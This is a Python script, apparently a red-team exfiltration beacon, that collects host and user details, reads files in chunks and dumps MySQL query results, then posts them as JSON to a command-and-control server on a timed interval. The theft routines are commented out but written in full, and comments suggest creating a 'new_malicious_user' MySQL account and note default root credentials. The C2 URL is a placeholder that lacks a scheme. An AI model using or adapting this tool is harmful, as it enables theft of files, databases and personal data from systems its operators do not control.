import requests
import time
import os
import socket
import mysql.connector  # Used for the MySQL database example

# Configuration
C2_URL = 'x.x.x.x/exfil'#Change to the redteams server you want to beacon back to.
INTERVAL = 60  # Beacon interval in seconds

# File Exfiltration Configuration
EXFIL_FILE = '/path/to/your/file.txt'  # Replace with the path to the file you want to exfiltrate

# MySQL Database Exfiltration Configuration
DB_HOST = 'your_mysql_host'  # Replace with the ip of the server with the database
DB_USER = 'your_mysql_user'  # Replace with a valid mysql user ----------------------------------
# login to mysql with "sudo mysql -u root -p" | "root":"" is the default cred for mysql.
# Create a new user just in case ;) "CREATE USER 'new_malicious_user'@'%' IDENTIFIED BY 'new_malicious_password'";
#------------------------------------------------------------------------------------------------
DB_PASSWORD = 'your_mysql_password'  # Replace with your MySQL password
DB_NAME = 'your_database_name'  # Replace with the name of the database you want to pull data from. **show all databases with "SHOW DATABASES;"
DB_QUERY = 'SELECT * FROM some_database'  # Replace with the query to exfiltrate data. **You can also choose to exfil a single table/column.

# User Data Exfiltration Configuration
USER_DATA = {
    'username': os.getlogin(),  # Current logged-in user
    'home_directory': os.path.expanduser('~'),  # User's home directory
    'shell': os.environ.get('SHELL')  # User's default shell
}

def get_system_info():
    return {
        'hostname': socket.gethostname(),
        'ip': socket.gethostbyname(socket.gethostname())
    }

def read_file_chunk(file_path, chunk_size=1024):
    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break;
            yield chunk

def fetch_mysql_data(host, user, password, database, query):
    conn = mysql.connector.connect(
        host=host,
        user=user,
        password=password,
        database=database
    )
    cursor = conn.cursor()
    cursor.execute(query)
    rows = cursor.fetchall()
    conn.close()
    return rows

def beacon():
    system_info = get_system_info()
    
    # Option 1: Exfiltrate data from a file
    # Uncomment the following block to exfiltrate file data
    
    # for chunk in read_file_chunk(EXFIL_FILE):
    #     payload = {
    #         'system_info': system_info,
    #         'data_chunk': chunk.hex()  # Send the chunk as a hex-encoded string
    #     }
    #     send_payload(payload)
    
    # Option 2: Exfiltrate data from a MySQL database
    # Uncomment the following block to exfiltrate database data
    
    # db_data = fetch_mysql_data(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME, DB_QUERY)
    # for row in db_data:
    #     payload = {
    #         'system_info': system_info,
    #         'data_row': str(row)  # Convert the row to a string for transmission
    #     }
    #     send_payload(payload)
    
    # Option 3: Exfiltrate user data
    # Uncomment the following block to exfiltrate user data
    
    # payload = {
    #     'system_info': system_info,
    #     'user_data': USER_DATA  # Send user-related information
    # }
    # send_payload(payload)

def send_payload(payload):
    try:
        response = requests.post(C2_URL, json=payload)
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data: {e}")
    
    time.sleep(INTERVAL)

if __name__ == "__main__":
    beacon()
